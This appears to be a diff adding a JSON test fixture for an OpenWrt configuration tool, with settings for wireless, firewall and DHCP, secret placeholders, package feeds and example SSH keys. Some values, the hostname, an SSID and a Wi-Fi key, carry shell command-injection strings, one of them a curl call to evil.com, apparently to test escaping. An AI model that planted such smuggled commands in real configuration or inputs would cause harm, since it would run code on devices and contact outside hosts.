@@ -1,0 +1,95 @@
+{
+  "settings": {
+    "system": {
+      "system": {
+        "_type": "system",
+        "hostname": "OpenWrt-$(evil)",
+        "timezone": "CET-1CEST,M3.5.0,M10.5.0/3"
+      }
+    },
+    "network": {
+      "lan": {
+        "_type": "interface",
+        "proto": "static",
+        "ipaddr": "192.168.1.1",
+        "netmask": "255.255.255.0"
+      }
+    },
+    "wireless": {
+      "default_radio0": {
+        "_type": "wifi-iface",
+        "device": "radio0",
+        "network": "lan",
+        "mode": "ap",
+        "ssid": "TestNet_`id`",
+        "encryption": "sae-mixed",
+        "key": "pa$$w0rd$(whoami)$(curl evil.com)"
+      },
+      "default_radio1": {
+        "_type": "wifi-iface",
+        "device": "radio1",
+        "network": "lan",
+        "mode": "ap",
+        "ssid": "admin's WiFi",
+        "encryption": "psk2",
+        "key": "@wifi_password@"
+      }
+    },
+    "dhcp": {
+      "lan": {
+        "_type": "dhcp",
+        "interface": "lan",
+        "start": "100",
+        "limit": "150",
+        "leash_time": "12h"
+      }
+    },
+    "firewall": {
+      "zone_lan": {
+        "_type": "zone",
+        "name": "lan",
+        "input": "ACCEPT",
+        "output": "ACCEPT",
+        "forward": "ACCEPT"
+      },
+      "rule_nopeer": {
+        "_type": "rule",
+        "name": "Block peer-to-peer",
+        "src": "wan",
+        "dest": "lan",
+        "target": "REJECT",
+        "proto": "tcp",
+        "dest_port": "6881-6889"
+      }
+    },
+    "multiples": {
+      "secrets_in_one": {
+        "_type": "test",
+        "val": "prefix_@secret1@_middle_@secret2@_suffix"
+      },
+      "types": {
+        "_type": "test",
+        "str_opt": "hello",
+        "int_opt": 42,
+        "float_opt": 3.14,
+        "bool_opt": true,
+        "int_list": [1, 2, 3],
+        "mixed_list": ["a", "b", "c"]
+      }
+    }
+  },
+  "packages": ["luci", "tcpdump", "tinc", "rsync", "htop"],
+  "opkg": {
+    "feeds": [
+      "src/gz kiddin9 https://dl.openwrt.ai/packages/aarch64_cortex-a53/kiddin9"
+    ],
+    "localPackages": [
+      "./packages/luci-app-nlbwmon_0.3-1_all.ipk",
+      "./packages/luci-i18n-nlbwmon-zh-cn_0.3-1_all.ipk"
+    ]
+  },
+  "sshKeys": [
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey1 user@host1",
+    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQExampleKey2 user@host2"
+  ]
+}
